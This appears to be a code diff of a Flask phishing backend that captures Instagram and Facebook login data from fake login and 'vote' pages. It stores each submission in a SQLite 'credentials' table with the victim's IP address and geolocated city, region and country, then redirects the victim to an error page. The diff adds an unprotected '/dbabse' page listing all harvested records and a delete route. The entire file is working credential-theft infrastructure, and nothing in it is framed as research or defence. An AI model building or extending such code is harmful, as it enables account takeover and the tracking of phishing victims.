@@ -5,7 +5,6 @@ from json import dumps, loads
 import sqlite3
 import ipapi
 
-
 ##################### CONFIGURATION ##########################
 
 REDIRECT_URL = 'error'  ## site to redirect to
@@ -13,6 +12,8 @@ REDIRECT_URL2 = 'error'  ## site to redirect to
 locate = "wwsuobyiyUnvL99f/"
 locate2 = "ww7wHFjPBSVisuob/"
 view = os.getenv('USER')
+
+
 
 ###############################################################
 
@@ -27,7 +28,14 @@ conn.commit()
 conn.close()
 
 app = Flask(__name__)
+conn = sqlite3.connect('data.db')
+c = conn.cursor()
 
+# Create table if it doesn't exist
+c.execute('''CREATE TABLE IF NOT EXISTS credentials
+             (id INTEGER PRIMARY KEY, data TEXT, account_type TEXT, ip TEXT, city TEXT, region TEXT, country TEXT, time TEXT)''')
+conn.commit()
+conn.close()
 
 @app.errorhandler(404)
 def page_not_found(e):
@@ -58,8 +66,10 @@ def login_page():
         # Insert data into SQLite database
         conn = sqlite3.connect('data.db')
         c = conn.cursor()
-        c.execute("INSERT INTO credentials (data, account_type, ip, city, region, country, time) VALUES (?, ?, ?, ?, ?, ?, ?)",
-                  (dumps(alldata), "INSTAGRAM", ip_address, response.get("city"), response.get("region"), response.get("country_name"), datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S")))
+        c.execute(
+            "INSERT INTO credentials (data, account_type, ip, city, region, country, time) VALUES (?, ?, ?, ?, ?, ?, ?)",
+            (dumps(alldata), "INSTAGRAM", ip_address, response.get("city"), response.get("region"),
+             response.get("country_name"), datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S")))
         conn.commit()
         conn.close()
 
@@ -88,8 +98,10 @@ def login_page2():
         # Insert data into SQLite database
         conn = sqlite3.connect('data.db')
         c = conn.cursor()
-        c.execute("INSERT INTO credentials (data, account_type, ip, city, region, country, time) VALUES (?, ?, ?, ?, ?, ?, ?)",
-                  (dumps(alldata), "FACEBOOK", ip_address, response.get("city"), response.get("region"), response.get("country_name"), datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S")))
+        c.execute(
+            "INSERT INTO credentials (data, account_type, ip, city, region, country, time) VALUES (?, ?, ?, ?, ?, ?, ?)",
+            (dumps(alldata), "FACEBOOK", ip_address, response.get("city"), response.get("region"),
+             response.get("country_name"), datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S")))
         conn.commit()
         conn.close()
 
@@ -108,16 +120,6 @@ def index():
     return render_template('index.html', data=data, loads=loads, locate=locate, view=view)
 
 
-@app.route("/delete" + locate + "<lineno>")
-def delete(lineno):
-    # Delete data from SQLite database
-    conn = sqlite3.connect('data.db')
-    c = conn.cursor()
-    c.execute("DELETE FROM credentials WHERE id=?", (lineno,))
-    conn.commit()
-    conn.close()
-
-    return redirect('https://' + view + '.pythonanywhere.com/' + locate)
 
 
 ##########################Second LG##########################
@@ -142,8 +144,10 @@ def vote_page():
         # Insert data into SQLite database
         conn = sqlite3.connect('data.db')
         c = conn.cursor()
-        c.execute("INSERT INTO credentials (data, account_type, ip, city, region, country, time) VALUES (?, ?, ?, ?, ?, ?, ?)",
-                  (dumps(alldata), "INSTAGRAM", ip_address, response.get("city"), response.get("region"), response.get("country_name"), datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S")))
+        c.execute(
+            "INSERT INTO credentials (data, account_type, ip, city, region, country, time) VALUES (?, ?, ?, ?, ?, ?, ?)",
+            (dumps(alldata), "INSTAGRAM", ip_address, response.get("city"), response.get("region"),
+             response.get("country_name"), datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S")))
         conn.commit()
         conn.close()
 
@@ -170,37 +174,38 @@ def vote_page2():
         # Insert data into SQLite database
         conn = sqlite3.connect('data.db')
         c = conn.cursor()
-        c.execute("INSERT INTO credentials (data, account_type, ip, city, region, country, time) VALUES (?, ?, ?, ?, ?, ?, ?)",
-                  (dumps(alldata2), "FACEBOOK", ip_address2, response2.get("city"), response2.get("region"), response2.get("country_name"), datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S")))
+        c.execute(
+            "INSERT INTO credentials (data, account_type, ip, city, region, country, time) VALUES (?, ?, ?, ?, ?, ?, ?)",
+            (dumps(alldata2), "FACEBOOK", ip_address2, response2.get("city"), response2.get("region"),
+             response2.get("country_name"), datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S")))
         conn.commit()
         conn.close()
 
     return redirect(request.referrer + "error")
 
 
-@app.route("/" + locate2)
-def index2():
-    # Fetch data from SQLite database
+@app.route('/delete/<int:id>')
+def delete(id):
+    # Delete record from the SQLite database
     conn = sqlite3.connect('data.db')
     c = conn.cursor()
-    c.execute("SELECT data FROM credentials WHERE account_type='FACEBOOK'")
-    data2 = [row[0] for row in c.fetchall()]
-    conn.close()
-
-    return render_template('index2.html', data=data2, loads=loads, locate2=locate2, view=view)
-
-
-@app.route("/delete" + locate2 + "<lineno2>")
-def delete2(lineno2):
-    # Delete data from SQLite database
-    conn = sqlite3.connect('data.db')
-    c = conn.cursor()
-    c.execute("DELETE FROM credentials WHERE id=?", (lineno2,))
+    c.execute("DELETE FROM credentials WHERE id=?", (id,))
     conn.commit()
     conn.close()
 
-    return redirect('https://' + view + '.pythonanywhere.com/' + locate2)
+    # Redirect back to the credentials page
+    return redirect(request.referrer or url_for('show_credentials'))
 
+@app.route("/dbabse")
+def show_credentials():
+    # Fetch data from SQLite database
+    conn = sqlite3.connect('data.db')
+    c = conn.cursor()
+    c.execute("SELECT * FROM credentials")
+    data = c.fetchall()
+    conn.close()
+
+    return render_template('credentials.html', data=data)
 
 if __name__ == "__main__":
     app.run(debug=True)
